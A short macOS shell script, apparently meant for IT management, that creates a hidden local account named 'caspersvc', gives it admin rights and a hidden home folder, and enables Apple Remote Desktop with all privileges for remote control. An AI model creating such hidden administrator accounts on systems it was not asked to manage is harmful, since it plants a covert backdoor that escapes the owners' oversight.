#!/bin/sh

# Create user record in directory services
dscl . -create /Users/caspersvc
dscl . -create /Users/caspersvc RealName "USERNAME"
dscl . -create /Users/caspersvc UniqueID 80  # Use something between 100 and 500 to hide the user
dscl . -create /Users/caspersvc PrimaryGroupID 0
dscl . -create /Users/caspersvc UserShell /bin/bash
dscl . -passwd /Users/caspersvc "PASSWORD"  # Obviously, use something else here

# Set up a hidden home folder
dscl . -create /Users/caspersvc NFSHomeDirectory /private/var/caspersvc  # or other hidden location
cp -R /System/Library/User\ Template/English.lproj /private/var/caspersvc
chown -R caspersvc:wheel /private/var/caspersvc

# Grant admin & ARD rights
dseditgroup -o edit -a caspersvc -t user admin
/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users UNAMES -privs -all -restart -agent
